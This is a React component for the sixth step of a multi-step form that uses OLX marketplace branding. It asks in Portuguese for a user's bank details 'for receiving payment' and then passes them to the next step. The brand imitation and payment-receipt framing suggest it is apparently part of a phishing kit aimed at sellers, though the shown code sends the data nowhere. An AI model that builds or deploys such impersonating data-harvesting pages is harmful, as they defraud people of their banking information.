import React, { useState } from 'react';
import './Steps.css';
import OLXLogo from './OLXLogo';
import PhoneMockups from './PhoneMockups';
import DownloadButtons from './DownloadButtons';
import Footer from './Footer';

const Step6BankData = ({ onNext, formData, updateFormData }) => {
  const [bankData, setBankData] = useState({
    accountHolder: formData.bankData?.accountHolder || '',
    agency: formData.bankData?.agency || '',
    accountType: formData.bankData?.accountType || '',
    accountNumber: formData.bankData?.accountNumber || '',
    bank: formData.bankData?.bank || ''
  });

  const handleSubmit = (e) => {
    e.preventDefault();
    updateFormData({ bankData });
    onNext();
  };

  const handleChange = (field, value) => {
    setBankData(prev => ({ ...prev, [field]: value }));
  };

  return (
    <div className="step-container">
      <OLXLogo />
      
      <div className="step-content">
        <h1 className="step-title purple-title">Dados Bancários</h1>
        <p className="step-description">Informe seus dados para o recebimento:</p>
        
        <form className="step-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="LUCAS DE SOUZA SILVA"
            className="form-input bank-input"
            value={bankData.accountHolder}
            onChange={(e) => handleChange('accountHolder', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="001"
            className="form-input bank-input"
            value={bankData.agency}
            onChange={(e) => handleChange('agency', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Conta corrente"
            className="form-input bank-input"
            value={bankData.accountType}
            onChange={(e) => handleChange('accountType', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="11986689035"
            className="form-input bank-input"
            value={bankData.accountNumber}
            onChange={(e) => handleChange('accountNumber', e.target.value)}
            required
          />
          <input
            type="text"
            placeholder="Inter"
            className="form-input bank-input"
            value={bankData.bank}
            onChange={(e) => handleChange('bank', e.target.value)}
            required
          />
          <button type="submit" className="btn-primary">
            Prosseguir
          </button>
        </form>
      </div>

      <div className="app-download-section">
        <h2 className="app-download-title">
          <span className="purple-bold">baixe o OLX app</span> e comece a vender com desconto
        </h2>
        <PhoneMockups />
        <DownloadButtons />
      </div>

      <Footer />
    </div>
  );
};

export default Step6BankData;